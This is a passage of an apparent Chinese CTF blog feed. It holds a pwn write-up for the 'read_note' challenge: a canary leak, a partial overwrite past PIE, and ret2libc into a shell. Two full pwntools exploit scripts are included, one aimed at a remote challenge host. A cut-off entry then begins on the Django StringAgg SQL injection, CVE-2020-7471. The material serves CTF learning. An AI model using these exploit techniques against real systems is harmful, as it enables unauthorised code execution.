class="string">&#x27;b&#x27;</span>)</span><br><span class="line">canary = u64(<span class="string">&#x27;\x00&#x27;</span> + r.recv(<span class="number">7</span>))</span><br><span class="line"><span class="comment">#log.info(&quot;canary: &quot; + hex(canary))</span></span><br></pre></td></tr></table></figure><p>有些人发送payload用sendline，就会多一个\n回车，这样payload就不需要多一位覆盖了。<br>然后就是覆盖retaddr。<br>IDA中没看到可利用的函数，所以考虑ret2libc。但是vul利用只能泄露一个值，所以要多次执行vul，就需要多次ret到main的开始地址来多次执行。虽然开了PIE保护，但是后三位地址是不变的，这样即使前面的偏移变了，我只覆盖低位的地址一样可以跳回main，从而绕过PIE。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200405115922.png" alt=""><br>通过IDA可以看到call vul后的返回地址是D2E，而main的起始地址是D20，所以只需溢出一个字节的0x20就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&quot;(len is 624)&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">600</span> + p64(canary) + p64(<span class="number">1</span>) + <span class="string">&#x27;\x20&#x27;</span></span><br><span class="line">r.send(payload)</span><br></pre></td></tr></table></figure><p>这一次需要泄露出程序的基址，因为后面找到pop_rdi的偏移需要加上这个基址才能得到实际的地址。<br>上面提到在main调用vul函数之后，会将call vull的下一条指令地址作为vul的ret地址，也就是上图D2E，这样只需要leak出这个返回地址再减去D2E即刻得到程序基址。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&quot;path:&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;len:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;1000&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;please input the note:\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">615</span> + <span class="string">&#x27;b&#x27;</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)) - <span class="number">0xD2E</span></span><br><span class="line">main_addr = base + <span class="number">0xD20</span></span><br><span class="line"><span class="comment">#log.info(&quot;base: &quot; + hex(base))</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;(len is 624)&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">600</span> + p64(canary) + p64(<span class="number">1</span>) + p64(main_addr)</span><br><span class="line">r.send(payload)</span><br></pre></td></tr></table></figure><p>main地址也可以通过base加上0xD20取得了。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main_addr = base + <span class="number">0xD20</span></span><br></pre></td></tr></table></figure><p>然后就可以通过将main_addr覆盖返回地址来检验我们泄露的基址是否正确。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200420104944.png" alt=""><br>这里有个问题就是我要接收多少个字节，这可以本地调试结合DEBUG接收的内容来确定。在本地调试可以看到这些地址高两个字节都是0x00，然后远端调试接收内容来看也只有6个字节。最后解包要用ljust用\x00填满8字节。<br>再次回到main之后，这次我们需要拿到libc的基址，很显然我们可以通过泄露libc_start_main拿到，但是libc_start_main的位置我们需要稍微思考一下。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200420111340.png" alt=""><br><del>首先分析main的指令，我们多次ret2main，都会进行push rbp的抬栈动作。程序启动时执行了一次，跳回了两次main，也就执行了两次，总共执行3次，然后call vul时也会执行一次，也就是4次。那么main的返回地址libc_start_main+240和vul的返回地址就相差了4*8，这样我们填充就要在覆盖vul返回地址的2*8(canary+rbp)的基础上再加上4*8也就是48。</del><br><strong>更新</strong><br><img src="https://gitee.com/sncker/resource/raw/master/image/20200424172540.png" alt=""><br>再配一台ubuntu16后本地打一遍发现上面的说法有误。通过观察栈可以知道，main+14也就是0xD2E距离__libc_start_main+240本来就有0x8的偏移，也就是说48=8(cannary)+3(ebp)*8+8(main+14)+8(__libc_csu_init)。上面的说法错在把call vul压入的返回地址强行再算一次。所以算这些乱七八糟的还不如附加调试看一下栈分布简单。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&quot;path:&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;len:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;1000&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;please input the note:\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">647</span> + <span class="string">&#x27;b&#x27;</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">libc_start_main = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)) - <span class="number">240</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;__libc_start_main&quot;</span>, libc_start_main)</span><br><span class="line">libc_base = libc_start_main - libc.dump(<span class="string">&quot;__libc_start_main&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">600</span> + p64(canary) + p64(<span class="number">1</span>) + p64(main_addr)</span><br><span class="line">r.send(payload)</span><br></pre></td></tr></table></figure><p>拿到libc_start_main后就是常规的ret2libc了。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200420103538.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi_ret = <span class="number">0x0000000000000e03</span></span><br><span class="line">pop_rdi_ret_addr = base + pop_rdi_ret</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;path:&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;len:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;1000&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;please input the note:\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">600</span> + p64(canary) + p64(<span class="number">1</span>) + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">&quot;(len is 624)&quot;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200420114414.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4278bbab-7780-4d89-8443-612d24aa87c6&#125;</span><br></pre></td></tr></table></figure><p>完整代码  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = process(&quot;./read_note&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;114.116.54.89&quot;</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;path:&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;len:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;1000&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;please input the note:\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">600</span> + <span class="string">&#x27;b&#x27;</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">canary = u64(<span class="string">&#x27;\x00&#x27;</span> + r.recv(<span class="number">7</span>))</span><br><span class="line"><span class="comment">#log.info(&quot;canary: &quot; + hex(canary))</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;(len is 624)&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">600</span> + p64(canary) + p64(<span class="number">1</span>) + <span class="string">&#x27;\x20&#x27;</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;path:&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;len:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;1000&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;please input the note:\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">615</span> + <span class="string">&#x27;b&#x27;</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)) - <span class="number">0xD2E</span></span><br><span class="line">main_addr = base + <span class="number">0xD20</span></span><br><span class="line"><span class="comment">#log.info(&quot;base: &quot; + hex(base))</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;(len is 624)&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">600</span> + p64(canary) + p64(<span class="number">1</span>) + p64(main_addr)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;path:&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;len:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;1000&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;please input the note:\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">647</span> + <span class="string">&#x27;b&#x27;</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">libc_start_main = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)) - <span class="number">240</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;__libc_start_main&quot;</span>, libc_start_main)</span><br><span class="line">libc_base = libc_start_main - libc.dump(<span class="string">&quot;__libc_start_main&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">600</span> + p64(canary) + p64(<span class="number">1</span>) + p64(main_addr)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000000e03</span></span><br><span class="line">pop_rdi_ret_addr = base + pop_rdi_ret</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;path:&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;len:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;1000&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;please input the note:\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">600</span> + p64(canary) + p64(<span class="number">1</span>) + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">&quot;(len is 624)&quot;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><strong>后续</strong><br>在网上的看到的wp全都是跳回0xD20，这样导致的问题就是要算多次push ebp的偏移。经我观察其实跳call vul就可以了，毕竟漏洞都是vul函数里的。也不用算那些乱起八糟的偏移(调试看栈分布的倒是影响不大)。<br>船新版本exp  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./read_note&quot;</span>)</span><br><span class="line"><span class="comment">#r = remote(&quot;114.116.54.89&quot;, 10000)</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">&quot;path:&quot;</span>, <span class="string">&quot;flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;len:&quot;</span>, <span class="string">&quot;1000&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">600</span> + <span class="string">&#x27;b&#x27;</span></span><br><span class="line">r.sendafter(<span class="string">&quot;please input the note:\n&quot;</span>, payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">canary = u64(<span class="string">&#x27;\x00&#x27;</span> + r.recv(<span class="number">7</span>))</span><br><span class="line"><span class="comment">#log.info(&quot;canary: &quot; + hex(canary))</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">600</span> + p64(canary) + p64(<span class="number">1</span>) + <span class="string">&#x27;\x29&#x27;</span></span><br><span class="line">r.sendafter(<span class="string">&quot;(len is 624)&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">&quot;path:&quot;</span>, <span class="string">&quot;flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;len:&quot;</span>, <span class="string">&quot;1000&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">615</span> + <span class="string">&#x27;b&#x27;</span></span><br><span class="line">r.sendafter(<span class="string">&quot;please input the note:\n&quot;</span>, payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)) - <span class="number">0xD2E</span></span><br><span class="line">call_vul_addr = base + <span class="number">0xD29</span></span><br><span class="line"><span class="comment">#log.info(&quot;base: &quot; + hex(base))</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">600</span> + p64(canary) + p64(<span class="number">1</span>) + p64(call_vul_addr)</span><br><span class="line">r.sendafter(<span class="string">&quot;(len is 624)&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">&quot;path:&quot;</span>, <span class="string">&quot;flag&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;len:&quot;</span>, <span class="string">&quot;1000&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">631</span> + <span class="string">&#x27;b&#x27;</span></span><br><span class="line">r.sendafter(<span class="string">&quot;please input the note:\n&quot;</span>, payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">libc_start_main = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)) - <span class="number">240</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;__libc_start_main&quot;</span>, libc_start_main)</span><br><span class="line">libc_base = libc_start_main - libc.dump(<span class="string">&quot;__libc_start_main&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">600</span> + p64(canary) + p64(<span class="number">1</span>) + p64(call_vul_addr)</span><br><span class="line">r.sendafter(<span class="string">&quot;(len is 624)&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000000e03</span></span><br><span class="line">pop_rdi_ret_addr = base + pop_rdi_ret</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">&quot;path:&quot;</span>, <span class="string">&quot;flag&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;len:&quot;</span>, <span class="string">&quot;1000&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">600</span> + p64(canary) + p64(<span class="number">1</span>) + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">r.sendafter(<span class="string">&quot;please input the note:\n&quot;</span>, payload)</span><br><span class="line">r.sendafter(<span class="string">&quot;(len is 624)&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h1&gt;&lt;h2 id=&quot;pwn1&quot;&gt;&lt;a href=&quot;#pwn1&quot; class=&quot;headerlink&quot; title=&quot;pwn1&quot;&gt;&lt;/a&gt;pwn1&lt;/h2&gt;&lt;p&gt;题目：nc 114.116.54.89 10001  &lt;/p&gt;
&lt;p&gt;nc上去直接给shell&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;nc 114.116.54.89 10001&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ls&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dev&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;flag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;helloworld&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;lib&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;lib32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;lib64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cat flag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;flag&amp;#123;6979d853add353c9&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://sncker.github.io/blog/categories/CTF/"/>
    
    <category term="WriteUp" scheme="https://sncker.github.io/blog/categories/CTF/WriteUp/"/>
    
    
    <category term="Bugku" scheme="https://sncker.github.io/blog/tags/Bugku/"/>
    
  </entry>
  
  <entry>
    <title>Django分隔符SQL注入漏洞（CVE-2020-7471）</title>
    <link href="https://sncker.github.io/blog/2020/02/18/Django%E5%88%86%E9%9A%94%E7%AC%A6%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-7471%EF%BC%89/"/>
    <id>https://sncker.github.io/blog/2020/02/18/Django%E5%88%86%E9%9A%94%E7%AC%A6%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-7471%EF%BC%89/</id>
    <published>2020-02-18T09:43:00.000Z</published>
    <updated>2020-05-06T01:23:55.977Z</updated>
    
    <content type="html"><![CDATA[<p>前阵子搞小项目有需求把django入了个门，今天看到了个新鲜的django注入漏洞，去了解了一下，不是太复杂，跟着别人的思路做个小文章。  </p><h1 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h1><p>看官方的介绍。  </p><blockquote><p>Django 1.11 before 1.11.28, 2.2 before 2.2.10, and 3.0 before 3.0.3 allows SQL Injection if untrusted data is used as a StringAgg delimiter (e.g., in Django applications that offer downloads of data as a series of rows with a user-specified column delimiter). By passing a suitably crafted delimiter to a contrib.postgres.aggregates.StringAgg instance, it was possible to break escaping and inject malicious SQL.  </p></blockquote><a id="more"></a><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200218181615.png" alt=""></p><p>漏洞点在聚合函数StringAgg的分隔符delimiter参数，接下来要思考如何去利用这个漏洞。  </p><h1 id="官方修复"><a href="#官方修复" class="headerlink" title="官方修复"></a>官方修复</h1><p>细品官方的修复，毕竟如何修肯定存在它的道理。。。  </p><p>看StringAgg模板的改动  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, expression, delimiter, **extra</span>):</span></span><br><span class="line"><span class="comment">#super().__init__(expression, delimiter=delimiter, **extra)</span></span><br><span class="line">delimiter_expr = Value(<span class="built_in">str</span>(delimiter))</span><br><span class="line"><span class="built_in">super</span>().__init__(expression, delimiter_expr, **extra)</span><br></pre></td></tr></table></figure><p>分隔符使用Value做了处理，我们查看Value的源码  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Value</span>(<span class="params">Expression</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Represent a wrapped value as a node within an expression.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, value, output_field=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Arguments:</span></span><br><span class="line"><span class="string">         * value: the value this expression represents. The value will be</span></span><br><span class="line"><span class="string">           added into the sql parameter list and properly quoted.</span></span><br><span class="line"><span class="string">         * output_field: an instance of the model field type that this</span></span><br><span class="line"><span class="string">           expression will return, such as IntegerField() or CharField().</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(output_field=output_field)</span><br><span class="line">        self.value = value</span><br></pre></td></tr></table></figure><p>经Value处理的参数会被加入到sql参数列表中，再由django的过滤机制处理。<br>其实说到底，漏洞成因就是没有对分隔符做好处理。那接下来我们需要思考如何去触发漏洞。  </p><h1 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h1><p>首先要快速搭建测试环境，根据官方的说法安装存在漏洞的版本。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200220122833.png" alt=""><br>然后在服务器上用docker快速部署了一个postgresql。 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name postgres -e POSTGRES_PASSWORD=123456 -p 45002:5432 -d postgres</span><br></pre></td></tr></table></figure><p>配置django环境  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">django-admin startproject sqlvul_project</span><br><span class="line"><span class="built_in">cd</span> sqlvul_project</span><br><span class="line">django-admin startapp test_app</span><br></pre></td></tr></table></figure><p>注册我们的app，并配置好数据库<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200220171159.png" alt=""><br>定义一个模型用于测试<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200220170711.png" 